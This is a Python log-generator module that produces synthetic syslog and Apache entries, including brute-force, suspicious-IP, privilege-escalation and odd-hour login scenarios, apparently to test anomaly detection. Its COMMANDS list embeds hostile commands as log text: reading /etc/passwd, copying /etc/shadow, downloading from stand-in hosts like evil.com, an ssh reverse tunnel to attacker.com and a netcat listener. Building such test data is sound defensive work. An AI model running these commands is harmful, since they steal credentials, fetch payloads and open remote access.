# backend/generator.py

import random
from datetime import datetime, timedelta
from typing import List, Optional


# ============================================================
# DATA POOLS
# ============================================================

VALID_USERS = [
    "john.doe",
    "jane.smith",
    "devops",
    "ubuntu",
]

INVALID_USERS = [
    "admin1",
    "root2",
    "test",
    "guest",
    "backup",
    "oracle",
    "mysql",
    "ftp",
]

USERS = [
    "root",
    "admin",
    *VALID_USERS,
    "postgres",
    "www-data",
    "nginx",
    "mysql",
]

IPS = [
    "192.168.1.100",
    "192.168.1.105",
    "192.168.1.110",
    "10.0.0.50",
    "10.0.0.55",
    "172.16.0.10",
    "172.16.0.20",
    "203.0.113.50",
    "198.51.100.23",
    "45.33.32.156",
    "185.220.101.1",
    "91.189.89.42",
    "104.236.228.48",
    "128.199.143.211",
]

MALICIOUS_IPS = [
    "185.220.101.1",
    "91.189.89.42",
    "104.236.228.48",
    "203.0.113.50",
    "198.51.100.23",
]

HOSTNAMES = [
    "webserver-01",
    "db-primary",
    "app-server-02",
    "dev-box",
    "prod-lb-01",
]

SERVICES = [
    "sshd",
    "sudo",
    "apache2",
    "nginx",
    "kernel",
    "systemd",
    "cron",
    "fail2ban",
    "postfix",
    "docker",
]

APACHE_PATHS = [
    "/",
    "/api/users",
    "/api/login",
    "/dashboard",
    "/admin",
    "/api/data",
    "/static/js/app.js",
    "/api/health",
    "/api/upload",
    "/api/reports",
]

HTTP_METHODS = [
    "GET",
    "POST",
    "PUT",
    "DELETE",
    "PATCH",
]

HTTP_STATUS = [
    200,
    200,
    200,
    200,
    200,
    301,
    304,
    400,
    401,
    403,
    404,
    500,
    502,
    503,
]

COMMANDS = [
    "ls -la",
    "cat /etc/passwd",
    "systemctl status nginx",
    "df -h",
    "top -bn1",
    "netstat -tlnp",
    "ps aux",
    "tail -f /var/log/syslog",
    "chmod 777 /tmp",
    "cp /etc/shadow /tmp/",
    "curl http://evil.com/payload",
    "wget http://malicious.com/backdoor",
    "ssh -R 8080:localhost:80 attacker.com",
    "nc -lvp 4444",
    "python3 -m http.server 8080",
]


# ============================================================
# BASELINE SCENARIO WEIGHTS
# ============================================================

SCENARIOS = {
    "normal_traffic": 0.70,
    "failed_logins": 0.12,
    "unusual_activity": 0.04,
    "privilege_escalation": 0.04,
    "errors": 0.05,
    "suspicious": 0.05,
}


# ============================================================
# LOG GENERATOR
# ============================================================

class LogGenerator:

    def __init__(self):
        self.is_running = False
        self.log_count = 0

    # ========================================================
    # MAIN SYSLOG GENERATOR
    # ========================================================

    def generate_syslog(
        self,
        timestamp: Optional[datetime] = None,
    ) -> str:
        """
        Generate one realistic syslog entry.

        Used by the continuous background generator.
        """

        if timestamp is None:
            timestamp = datetime.now()

        self.log_count += 1

        time_str = timestamp.strftime("%b %d %H:%M:%S")
        hostname = random.choice(HOSTNAMES)
        pid = random.randint(1000, 65535)

        scenario = random.choices(
            list(SCENARIOS.keys()),
            weights=list(SCENARIOS.values()),
            k=1,
        )[0]

        if scenario == "normal_traffic":
            return self._normal_log(
                time_str,
                hostname,
                pid,
            )

        if scenario == "failed_logins":
            return self._failed_login_log(
                time_str,
                hostname,
                pid,
            )

        if scenario == "unusual_activity":
            return self._unusual_hour_log(
                time_str,
                hostname,
                pid,
            )

        if scenario == "privilege_escalation":
            return self._privilege_log(
                time_str,
                hostname,
                pid,
            )

        if scenario == "errors":
            return self._error_log(
                time_str,
                hostname,
                pid,
            )

        if scenario == "suspicious":
            return self._suspicious_log(
                time_str,
                hostname,
                pid,
            )

        return self._normal_log(
            time_str,
            hostname,
            pid,
        )

    # ========================================================
    # NORMAL LOG
    # ========================================================

    def _normal_log(
        self,
        time_str: str,
        hostname: str,
        pid: int,
    ) -> str:

        user = random.choice(VALID_USERS)
        ip = random.choice(IPS)

        templates = [
            (
                f"{time_str} {hostname} sshd[{pid}]: "
                f"Accepted publickey for {user} from {ip} "
                f"port {random.randint(40000, 65535)} ssh2"
            ),
            (
                f"{time_str} {hostname} systemd[1]: "
                f"Started Session {random.randint(1, 999)} "
                f"of User {user}."
            ),
            (
                f"{time_str} {hostname} CRON[{pid}]: "
                f"({user}) CMD "
                f"(test -x /usr/sbin/anacron)"
            ),
            (
                f"{time_str} {hostname} kernel: "
                f"[{random.uniform(0, 100):.6f}] "
                f"random: crng init done"
            ),
            (
                f"{time_str} {hostname} sshd[{pid}]: "
                f"Received disconnect from {ip} "
                f"port {random.randint(40000, 65535)}:11: "
                f"disconnected by user"
            ),
            (
                f"{time_str} {hostname} sshd[{pid}]: "
                f"pam_unix(sshd:session): "
                f"session opened for user {user} "
                f"by (uid=0)"
            ),
        ]

        return random.choice(templates)

    # ========================================================
    # FAILED LOGIN
    # ========================================================

    def _failed_login_log(
        self,
        time_str: str,
        hostname: str,
        pid: int,
    ) -> str:

        user = random.choice(
            VALID_USERS + INVALID_USERS
        )

        ip = random.choice(IPS)

        return (
            f"{time_str} {hostname} sshd[{pid}]: "
            f"Failed password for {user} from {ip} "
            f"port {random.randint(40000, 65535)} ssh2"
        )

    # ========================================================
    # ATTACK 1 — BRUTE FORCE
    # ========================================================

    def generateBruteForce(
        self,
        targetUser: str = "john.doe",
        targetIP: str = "185.220.101.1",
        count: int = 8,
    ) -> List[str]:
        """
        Generate a concentrated brute-force attack.

        Same user + same IP + repeated failed authentication.
        """

        count = max(5, count)

        now = datetime.now()
        logs = []

        hostname = random.choice(HOSTNAMES)

        for i in range(count):

            timestamp = now + timedelta(
                seconds=i
            )

            time_str = timestamp.strftime(
                "%b %d %H:%M:%S"
            )

            pid = random.randint(
                1000,
                65535,
            )

            logs.append(
                f"{time_str} {hostname} sshd[{pid}]: "
                f"Failed password for {targetUser} "
                f"from {targetIP} "
                f"port {random.randint(40000, 65535)} ssh2"
            )

        return logs

    # ========================================================
    # ATTACK 2 — SUSPICIOUS IP
    # ========================================================

    def generateSuspiciousIP(
        self,
        targetIP: Optional[str] = None,
        count: int = 5,
    ) -> List[str]:
        """
        Generate one IP attacking multiple accounts.
        """

        if targetIP is None:
            targetIP = random.choice(
                MALICIOUS_IPS
            )

        count = max(3, count)

        now = datetime.now()
        logs = []

        available_users = (
            VALID_USERS + INVALID_USERS
        )

        users = random.sample(
            available_users,
            min(
                count,
                len(available_users),
            ),
        )

        hostname = random.choice(
            HOSTNAMES
        )

        for i, user in enumerate(users):

            timestamp = now + timedelta(
                seconds=i * 2
            )

            time_str = timestamp.strftime(
                "%b %d %H:%M:%S"
            )

            pid = random.randint(
                1000,
                65535,
            )

            logs.append(
                f"{time_str} {hostname} sshd[{pid}]: "
                f"Failed password for {user} "
                f"from {targetIP} "
                f"port {random.randint(40000, 65535)} ssh2"
            )

        return logs

    # ========================================================
    # ATTACK 3 — PRIVILEGE ESCALATION
    # ========================================================

    def generatePrivilegeEscalation(
        self,
        user: str = "john.doe",
    ) -> List[str]:
        """
        Generate:

        1. Normal user login
        2. Same user executes sudo shortly afterward
        """

        now = datetime.now()

        ip = random.choice(IPS)
        hostname = random.choice(
            HOSTNAMES
        )

        login_time = now
        escalation_time = (
            now + timedelta(seconds=5)
        )

        login_str = login_time.strftime(
            "%b %d %H:%M:%S"
        )

        escalation_str = escalation_time.strftime(
            "%b %d %H:%M:%S"
        )

        pid1 = random.randint(
            1000,
            65535,
        )

        pid2 = random.randint(
            1000,
            65535,
        )

        return [
            (
                f"{login_str} {hostname} sshd[{pid1}]: "
                f"Accepted publickey for {user} "
                f"from {ip} "
                f"port {random.randint(40000, 65535)} ssh2"
            ),
            (
                f"{escalation_str} {hostname} sudo[{pid2}]: "
                f"{user} : TTY=pts/0 ; "
                f"PWD=/home/{user} ; "
                f"USER=root ; "
                f"COMMAND={random.choice(COMMANDS)}"
            ),
        ]

    # ========================================================
    # ATTACK 4 — UNUSUAL LOGIN TIME
    # ========================================================

    def generateUnusualTimeLogin(
        self,
        user: str = "john.doe",
    ) -> str:
        """
        Generate a valid login between 02:00 and 05:00.
        """

        now = datetime.now()

        timestamp = now.replace(
            hour=random.randint(2, 5),
            minute=random.randint(0, 59),
            second=random.randint(0, 59),
            microsecond=0,
        )

        time_str = timestamp.strftime(
            "%b %d %H:%M:%S"
        )

        hostname = random.choice(
            HOSTNAMES
        )

        ip = random.choice(IPS)

        pid = random.randint(
            1000,
            65535,
        )

        return (
            f"{time_str} {hostname} sshd[{pid}]: "
            f"Accepted password for {user} "
            f"from {ip} "
            f"port {random.randint(40000, 65535)} ssh2"
        )

    # ========================================================
    # ATTACK 5 — MULTIPLE FAILED LOGINS
    # ========================================================

    def generateMultipleFailedLogins(
        self,
        user: str = "john.doe",
        count: int = 4,
    ) -> List[str]:
        """
        Same user, multiple IP addresses.

        This is different from brute force because the
        attacker may be distributed across different IPs.
        """

        count = max(3, count)

        now = datetime.now()
        logs = []

        selected_ips = random.sample(
            IPS,
            min(
                count,
                len(IPS),
            ),
        )

        hostname = random.choice(
            HOSTNAMES
        )

        for i, ip in enumerate(
            selected_ips
        ):

            timestamp = now + timedelta(
                seconds=i * 3
            )

            time_str = timestamp.strftime(
                "%b %d %H:%M:%S"
            )

            pid = random.randint(
                1000,
                65535,
            )

            logs.append(
                f"{time_str} {hostname} sshd[{pid}]: "
                f"Failed password for {user} "
                f"from {ip} "
                f"port {random.randint(40000, 65535)} ssh2"
            )

        return logs

    # ========================================================
    # OTHER BASELINE EVENTS
    # ========================================================

    def _unusual_hour_log(
        self,
        time_str: str,
        hostname: str,
        pid: int,
    ) -> str:

        user = random.choice(
            VALID_USERS
        )

        ip = random.choice(IPS)

        return (
            f"{time_str} {hostname} sshd[{pid}]: "
            f"Accepted password for {user} "
            f"from {ip} "
            f"port {random.randint(40000, 65535)} ssh2"
        )

    def _privilege_log(
        self,
        time_str: str,
        hostname: str,
        pid: int,
    ) -> str:

        user = random.choice(
            VALID_USERS
        )

        command = random.choice(
            COMMANDS
        )

        return (
            f"{time_str} {hostname} sudo[{pid}]: "
            f"{user} : TTY=pts/0 ; "
            f"PWD=/home/{user} ; "
            f"USER=root ; "
            f"COMMAND={command}"
        )

    def _error_log(
        self,
        time_str: str,
        hostname: str,
        pid: int,
    ) -> str:

        return random.choice(
            [
                (
                    f"{time_str} {hostname} kernel: "
                    f"[{random.uniform(0, 100):.6f}] "
                    f"segfault at "
                    f"7fff{random.randint(10000000, 99999999)}"
                ),
                (
                    f"{time_str} {hostname} systemd[1]: "
                    f"{random.choice(SERVICES)}.service: "
                    f"Main process exited, "
                    f"code=killed, status=11/SEGV"
                ),
                (
                    f"{time_str} {hostname} kernel: "
                    f"[{random.uniform(0, 100):.6f}] "
                    f"Out of memory: "
                    f"Killed process "
                    f"{random.randint(1000, 9999)}"
                ),
            ]
        )

    def _suspicious_log(
        self,
        time_str: str,
        hostname: str,
        pid: int,
    ) -> str:

        ip = random.choice(
            MALICIOUS_IPS
        )

        destination_port = random.choice(
            [
                22,
                80,
                443,
                3306,
                5432,
                8080,
            ]
        )

        return (
            f"{time_str} {hostname} kernel: "
            f"[{random.uniform(0, 100):.6f}] "
            f"iptables DROP: IN=eth0 OUT= "
            f"SRC={ip} DST=10.0.0.1 "
            f"PROTO=TCP "
            f"SPT={random.randint(40000, 65535)} "
            f"DPT={destination_port}"
        )

    # ========================================================
    # APACHE LOG GENERATOR
    # ========================================================

    def generate_apache_log(
        self,
        timestamp: Optional[datetime] = None,
    ) -> str:

        if timestamp is None:
            timestamp = datetime.now()

        ip = random.choice(IPS)

        user = random.choice(
            VALID_USERS + ["-"]
        )

        time_str = timestamp.strftime(
            "%d/%b/%Y:%H:%M:%S +0530"
        )

        method = random.choice(
            HTTP_METHODS
        )

        path = random.choice(
            APACHE_PATHS
        )

        status = random.choice(
            HTTP_STATUS
        )

        size = random.randint(
            0,
            50000,
        )

        return (
            f'{ip} - {user} [{time_str}] '
            f'"{method} {path} HTTP/1.1" '
            f'{status} {size}'
        )


# ============================================================
# BASELINE BATCH GENERATOR
# ============================================================

def generate_logs_batch(
    count: int = 10,
    include_anomalies: bool = True,
) -> List[str]:
    """
    Generate a batch of realistic logs.

    include_anomalies controls whether the generated batch
    is allowed to contain suspicious/failed activity.
    """

    generator = LogGenerator()
    logs: List[str] = []

    if count <= 0:
        return logs

    for _ in range(count):

        if include_anomalies:
            use_syslog = random.random() < 0.8
        else:
            use_syslog = True

        if use_syslog:
            if include_anomalies:
                logs.append(
                    generator.generate_syslog()
                )
            else:
                logs.append(
                    generator._normal_log(
                        datetime.now().strftime(
                            "%b %d %H:%M:%S"
                        ),
                        random.choice(HOSTNAMES),
                        random.randint(
                            1000,
                            65535,
                        ),
                    )
                )
        else:
            logs.append(
                generator.generate_apache_log()
            )

    return logs


# ============================================================
# ANOMALY BURST ROUTER
# ============================================================

def generate_anomaly_burst(
    burst_type: str = "brute_force",
    count: int = 10,
) -> List[str]:
    """
    Generate an attack/anomaly burst based on its type.
    """

    generator = LogGenerator()

    burst_type = burst_type.lower().strip()

    if burst_type in {
        "brute_force",
        "bruteforce",
        "brute-force",
    }:

        return generator.generateBruteForce(
            targetUser="john.doe",
            targetIP="185.220.101.1",
            count=max(5, count),
        )

    if burst_type in {
        "suspicious_ip",
        "suspicious-ip",
        "suspiciousip",
    }:

        return generator.generateSuspiciousIP(
            targetIP="185.220.101.1",
            count=max(3, count),
        )

    if burst_type in {
        "privilege",
        "privilege_escalation",
        "privilege-escalation",
    }:

        return generator.generatePrivilegeEscalation(
            user="john.doe"
        )

    if burst_type in {
        "unusual_time",
        "unusual-time",
        "unusual_login_time",
    }:

        return [
            generator.generateUnusualTimeLogin(
                user="john.doe"
            )
        ]

    if burst_type in {
        "multiple_failed_logins",
        "multiple-failed-logins",
        "multiple_failed",
    }:

        return generator.generateMultipleFailedLogins(
            user="john.doe",
            count=max(3, min(count, 10)),
        )

    raise ValueError(
        f"Unknown burst type: {burst_type}. "
        f"Supported types: "
        f"brute_force, suspicious_ip, privilege, "
        f"unusual_time, multiple_failed_logins"
    )


# ============================================================
# MANUAL TEST
# ============================================================

if __name__ == "__main__":

    generator = LogGenerator()

    print("\n" + "=" * 60)
    print("NORMAL LOGS")
    print("=" * 60)

    for _ in range(10):
        print(
            generator.generate_syslog()
        )

    print("\n" + "=" * 60)
    print("BRUTE FORCE")
    print("=" * 60)

    for log in generator.generateBruteForce():
        print(log)

    print("\n" + "=" * 60)
    print("SUSPICIOUS IP")
    print("=" * 60)

    for log in generator.generateSuspiciousIP():
        print(log)

    print("\n" + "=" * 60)
    print("PRIVILEGE ESCALATION")
    print("=" * 60)

    for log in generator.generatePrivilegeEscalation():
        print(log)

    print("\n" + "=" * 60)
    print("UNUSUAL LOGIN TIME")
    print("=" * 60)

    print(
        generator.generateUnusualTimeLogin()
    )

    print("\n" + "=" * 60)
    print("MULTIPLE FAILED LOGINS")
    print("=" * 60)

    for log in generator.generateMultipleFailedLogins():
        print(log)